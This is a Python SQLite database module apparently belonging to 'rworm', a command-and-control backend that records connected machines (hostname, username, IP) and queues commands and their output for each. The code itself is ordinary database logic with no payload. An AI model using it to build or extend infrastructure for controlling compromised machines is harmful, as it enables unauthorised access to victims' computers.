import sqlite3
from datetime import datetime

class Database:
    def __init__(self, db_path: str = "rworm.db"):
        self.db_path = db_path
        self.init_db()
        
    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clients (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                guid TEXT UNIQUE NOT NULL,
                hostname TEXT,
                username TEXT,
                os_version TEXT,
                ip_address TEXT,
                country TEXT,
                is_online INTEGER DEFAULT 0,
                last_seen TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id INTEGER,
                command TEXT NOT NULL,
                output TEXT,
                status TEXT DEFAULT 'pending',
                created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                executed_at TEXT,
                FOREIGN KEY (client_id) REFERENCES clients(id)
            )
        ''')
        
        conn.commit()
        conn.close()
        
    def add_client(self, guid: str, hostname: str, username: str, os_version: str, ip_address: str) -> int:
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # GUID is the stable machine identity (persisted in %TEMP%\rworm.id).
        # The client's reconnect loop opens a NEW socket each retry, so the
        # same machine must UPDATE its existing row — never insert a second
        # one. INSERT OR REPLACE keeps exactly one row per GUID, so the
        # Clients page shows each machine once and reflects the latest
        # online session.
        cursor.execute('''
            INSERT INTO clients (guid, hostname, username, os_version, ip_address, is_online, last_seen)
            VALUES (?, ?, ?, ?, ?, 1, ?)
            ON CONFLICT(guid) DO UPDATE SET
                hostname   = excluded.hostname,
                username   = excluded.username,
                os_version = excluded.os_version,
                ip_address = excluded.ip_address,
                is_online  = 1,
                last_seen  = excluded.last_seen
        ''', (guid, hostname, username, os_version, ip_address, datetime.now().isoformat()))
        
        cursor.execute('SELECT id FROM clients WHERE guid = ?', (guid,))
        row = cursor.fetchone()
        client_id = row[0] if row else cursor.lastrowid
        conn.commit()
        conn.close()
        return client_id
        
    def update_client_status(self, guid: str, is_online: bool):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE clients SET is_online = ?, last_seen = ? WHERE guid = ?
        ''', (1 if is_online else 0, datetime.now().isoformat(), guid))
        
        conn.commit()
        conn.close()
        
    def get_client_by_guid(self, guid: str) -> dict:
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM clients WHERE guid = ?', (guid,))
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return {
                'id': row[0],
                'guid': row[1],
                'hostname': row[2],
                'username': row[3],
                'os_version': row[4],
                'ip_address': row[5],
                'is_online': bool(row[7])
            }
        return None
        
    def get_all_clients(self) -> list:
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM clients ORDER BY last_seen DESC')
        rows = cursor.fetchall()
        conn.close()
        
        clients = []
        for row in rows:
            clients.append({
                'id': row[0],
                'guid': row[1],
                'hostname': row[2],
                'username': row[3],
                'os_version': row[4],
                'ip_address': row[5],
                'is_online': bool(row[7]),
                'last_seen': row[8]
            })
        return clients
        
    def add_command(self, client_id: int, command: str, output: str = None, status: str = 'pending') -> int:
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO commands (client_id, command, output, status, executed_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (client_id, command, output, status, datetime.now().isoformat() if status == 'completed' else None))
        
        command_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return command_id
        
    def update_command(self, command_id: int, output: str, status: str):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE commands SET output = ?, status = ?, executed_at = ? WHERE id = ?
        ''', (output, status, datetime.now().isoformat(), command_id))
        
        conn.commit()
        conn.close()